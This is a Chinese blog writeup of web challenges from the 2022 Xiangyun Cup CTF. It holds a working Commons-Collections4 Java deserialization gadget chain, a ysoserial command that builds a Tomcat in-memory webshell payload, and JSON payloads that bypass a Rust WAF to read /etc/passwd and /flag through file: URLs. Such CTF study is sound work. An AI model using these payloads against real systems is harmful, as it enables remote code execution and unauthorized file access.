---
title: "2022 祥云杯 Web 部分 Writeup"
date: 2022-10-31T09:30:29+08:00
lastmod: 2022-10-31T09:30:29+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

看了两天的 `Token is invalid !!`...

<!--more-->

## ezjava

springboot 网站

controller

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302033773.png)

util (最后好像没用到)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034773.png)

lib

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302034341.png)

一眼看到 commons-collection4-4.0, 于是直接用 ysoserial 打

试了下 cc2 cc4 发现一直失败, 报错提示没有 TemplatesImpl 类 (?)

又换成了 cc6, 自己手动改了下 payload (4.0 版本中 LazyMap 的 decorate 方法变成了 lazyMap)

```java
package com.example;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections6Demo {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "key");
        Map expMap = new HashMap();
        expMap.put(tme, "value");
        innerMap.remove("key");
        Reflection.setFieldValue(transformerChain, "iTransformers", transformers);
        Serialization.exploit(expMap); // writeObject and readObject
    }
}
```

本地 idea 能弹出计算器, 自建一个 springboot 网站也能弹, 但是用题目给的 jar 运行就弹不了...

绕了一圈又找到了 Y4er 师傅的 ysoserial 修改版

[https://github.com/Y4er/ysoserial](https://github.com/Y4er/ysoserial)

又试了下 cc4 结合 TomcatCmdEcho 内存马

```bash
java -jar ysoserial-main-1736fa42da-1.jar CommonsCollections4 "CLASS:TomcatCmdEcho" | base64
```

发包时注意把 Content-Type 删掉

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302045474.png)

第二次发送的时候成功执行了命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302045093.png)

查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302046074.png)

后来想了想题目机器应该是不出网的, 一开始 cc2 的报错其实对于 rce 来说不影响, 结果后来换了个内存马的 payload 就成功了

不过 java 内存马目前还没怎么研究, 找个时间仔细看一下

## RustWaf

第一眼看到 rust 差点把我唬住了...

代码大体上能看懂是什么意思, 但是具体每一句每一个符号是什么作用就不清楚了, 语法糖有点多

app.js

```javascript
const express = require('express');
const app = express();
const bodyParser = require("body-parser")
const fs = require("fs")
app.use(bodyParser.text({type: '*/*'}));
const {  execFileSync } = require('child_process');

app.post('/readfile', function (req, res) {
    let body = req.body.toString();
    let file_to_read = "app.js";
    const file = execFileSync('/app/rust-waf', [body], {
        encoding: 'utf-8'
    }).trim();
    try {
        file_to_read = JSON.parse(file)
    } catch (e){
        file_to_read = file
    }
    let data = fs.readFileSync(file_to_read);
    res.send(data.toString());
});

app.get('/', function (req, res) {
    res.send('see `/src`');
});


app.get('/src', function (req, res) {
    var data = fs.readFileSync('app.js');
    res.send(data.toString());
});

app.listen(3000, function () {
    console.log('start listening on port 3000');
});
```

访问 /readfile post 传递 `/flag` 的时候得到了 main.rs

```rust
use std::env;
use serde::{Deserialize, Serialize};
use serde_json::Value;

static BLACK_PROPERTY: &str = "protocol";

#[derive(Debug, Serialize, Deserialize)]
struct File{
    #[serde(default = "default_protocol")]
    pub protocol: String,
    pub href: String,
    pub origin: String,
    pub pathname: String,
    pub hostname:String
}

pub fn default_protocol() -> String {
    "http".to_string()
}
//protocol is default value,can't be customized
pub fn waf(body: &str) -> String {
    if body.to_lowercase().contains("flag") ||  body.to_lowercase().contains("proc"){
        return String::from("./main.rs");
    }
    if let Ok(json_body) = serde_json::from_str::<Value>(body) {
        if let Some(json_body_obj) = json_body.as_object() {
            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) {
                return String::from("./main.rs");
            }
        }
        //not contains protocol,check if struct is File
        if let Ok(file) = serde_json::from_str::<File>(body) {
            return serde_json::to_string(&file).unwrap_or(String::from("./main.rs"));
        }
    } else{
        //body not json
        return String::from(body);
    }
    return String::from("./main.rs");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    println!("{}", waf(&args[1]));
}
```

waf 函数对于传入的 string 进行了过滤并最终返回一个文件路径, 然后 nodejs 根据路径读取指定文件并返回内容

body 如果包含 flag 或者 proc 关键词就会直接返回 `./main.rs`, 并且这里肯定是绕不过去的, 只能换个思路

注意到 rust 代码中有一个 File 结构体, 然后翻了翻 nodejs readFileSync 的文档

[https://nodejs.org/api/fs.html#fsreadfilesyncpath-options](https://nodejs.org/api/fs.html#fsreadfilesyncpath-options)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302054863.png)

发现 path 可以为 URL 对象

[https://nodejs.org/api/url.html#the-whatwg-url-api](https://nodejs.org/api/url.html#the-whatwg-url-api)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302055233.png)

可以看到 URL 对象的属性跟 File 结构体的属性基本上是一样的, 猜测 rust 应该是直接套用 struct 的格式来进行 json 反序列化, 遂构造 payload 如下

```json
{
    "protocol":"file:",
    "href":"1",
    "origin":"1",
    "pathname":"/etc/passwd",
    "hostname":""
}
```

提交后还是返回了 main.rs 的源码... 因为过滤了 protocol 关键字

```rust
if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) {
    return String::from("./main.rs");
}
```

想着用 hex 或者 unicode 绕过, 结果 nodejs 这句 `let body = req.body.toString();` 也把这种方法给 ban 掉了

后来根据 rust 引用的 `serde_json`, 到网上搜了一下

[https://brycec.me/posts/corctf_2022_challenges#rustshop](https://brycec.me/posts/corctf_2022_challenges#rustshop)

[https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop](https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop)

[https://pysnow.cn/archives/330/](https://pysnow.cn/archives/330/)

前两篇文章的意思是说 serde json 这个库既可以按照 dict 的 key-value 格式进行反序列化, 也可以按照 array 的格式按照顺序进行反序列化 (参照 struct 的结构)

刚好以 array 的形式反序列化时不需要传递 key, 从而绕过了对 protocol 关键词的检测

第三篇文章是说 URL 对象会对属性进行二次 urldecode, 正好可以用来绕过对 flag 关键词的检测

于是最终 payload 如下

```json
[
 "file:",
 "1",
 "1",
 "/%66%6c%61%67",
 ""
]
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302112882.png)

## FunWEB

等 wp 复现